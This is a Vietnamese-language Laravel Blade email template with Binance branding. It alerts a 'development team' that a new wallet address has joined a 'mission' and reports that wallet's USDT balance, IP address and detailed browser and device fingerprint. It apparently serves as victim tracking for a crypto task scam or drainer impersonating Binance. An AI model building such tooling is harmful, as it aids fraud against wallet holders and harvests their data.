<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Document</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Roboto&display=swap');

    * {
      margin: 0;
      padding: 0;
      font-family: 'Roboto', sans-serif;
    }

    *,
    *::before,
    *::after {
      box-sizing: border-box;
    }

    .email>a {
      text-decoration: none;
      color: #000;
    }
  </style>
</head>

<body>
  <div class="">
    <div tabindex="-1"></div>

    <div
      style="font-family:'Inter',sans-serif;font-size:16px;line-height:25px;color:#000000;margin:0;box-sizing:border-box;background:#f2f2f2">
      <div
        style="background-color: #fff; max-width:680px;margin-right:auto;margin-left:auto;padding:5px 25px;box-sizing:border-box">
        <div style="display: flex; color: #fff;align-items: center;">
          <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/12/Binance_logo.svg/1280px-Binance_logo.svg.png" alt="" style="height: 40px;">
          <b style="font-size: 18px; margin-left: 20px;line-height: 50px">
            Binance
          </b>
        </div>
      </div>
      <div
        style="background:white;padding:30px 20px;max-width:680px;margin-right:auto;margin-left:auto;box-sizing:border-box">
        <h4 style="font-size:16px;color:#000000;font-weight:600;margin-top:0;margin-bottom:19px;line-height:25px">
          Xin chào
        </h4>
        <p style="margin-top:0;margin-bottom:14px;color: #000;">
          Địa chỉ mới vừa được tham gia nhiệm vụ. Vui lòng kiểm tra.
        </p>
        <p style="margin-top:0;margin-bottom:14px;color: #000;">Nhiệm vụ {{ $mission }}</p>
        <p style="margin-top:0;margin-bottom:14px;color: #000;">Địa chỉ ví: <b>{{ $address }}</b> </p>

        <p style="margin-top:0;margin-bottom:14px;color: #000;">Số dư: <span style="color:#F0B90B;font-weight:600">{{ $balance }} </span> USDT</p>
        <p style="margin-top:0;margin-bottom:14px;color: #000;">Địa chỉ IP: {{ $ip }}</p>
        <p style="margin-top:0;margin-bottom:14px;color: #000;">Thông tin thiết bị: </p>
        <p style="margin-top:0;margin-bottom:14px;color: #000;">Trình duyệt: {{ $useragent['browser'] }} </p>
        <p style="margin-top:0;margin-bottom:14px;color: #000;">Phiên bản trình duyệt: {{ $useragent['browser_version'] }} </p>
        <p style="margin-top:0;margin-bottom:14px;color: #000;">Thiết bị: {{ $useragent['device'] }} </p>
        <p style="margin-top:0;margin-bottom:14px;color: #000;">Loại thiết bị: {{ $useragent['deviceType'] }} </p>
        <p style="margin-top:0;margin-bottom:14px;color: #000;">Hướng thiết bị: {{ $useragent['orientation'] }} </p>
        <p style="margin-top:0;margin-bottom:14px;color: #000;">Hệ điều hành: {{ $useragent['os'] }} </p>
        <p style="margin-top:0;margin-bottom:14px;color: #000;">Phiên bản hệ điều hành: {{ $useragent['os_version'] }} </p>
        <p style="margin-top:0;margin-bottom:14px;color: #000;">Thông tin trình duyệt: {{ $useragent['userAgent'] }} </p>

        <p style="margin-top:20px;margin-bottom:0;color: #000;">Trân trọng,</p>
        <p style="margin-top:0;margin-bottom:0px;color: #000;"><strong>Đội ngũ phát triển <span>
          </span>.</strong>
        </p>
      </div>

    </div>

  </div>

</body>

</html>